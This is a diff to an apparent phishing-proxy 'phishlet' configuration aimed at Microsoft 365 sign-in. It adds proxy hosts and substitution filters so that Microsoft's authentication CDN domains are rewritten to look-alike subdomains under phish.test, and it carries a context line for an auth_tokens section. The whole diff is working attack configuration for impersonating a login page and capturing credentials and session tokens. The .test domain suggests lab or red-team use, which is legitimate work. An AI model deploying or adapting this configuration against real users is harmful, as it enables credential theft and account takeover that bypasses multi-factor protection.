@@ -14,6 +14,14 @@ proxy_hosts:
     orig_sub: "login"
     domain: "live.com"
     is_landing: false
+  - phish_sub: "msauth"
+    orig_sub: "aadcdn"
+    domain: "msauth.net"
+    is_landing: false
+  - phish_sub: "msauthimg"
+    orig_sub: "aadcdn"
+    domain: "msftauthimages.net"
+    is_landing: false
 sub_filters:
   - triggers_on: "login.microsoftonline.com"
     search: "login.microsoftonline.com"
@@ -27,7 +35,12 @@ sub_filters:
     redirect_only: false
   - triggers_on: "aadcdn.msauth.net"
     search: "aadcdn.msauth.net"
-    replace: "m365.phish.test"
+    replace: "msauth.phish.test"
+    mime: ["text/html", "text/css", "application/json", "javascript"]
+    redirect_only: false
+  - triggers_on: "aadcdn.msftauthimages.net"
+    search: "aadcdn.msftauthimages.net"
+    replace: "msauthimg.phish.test"
     mime: ["text/html", "text/css", "application/json", "javascript"]
     redirect_only: false
 auth_tokens:
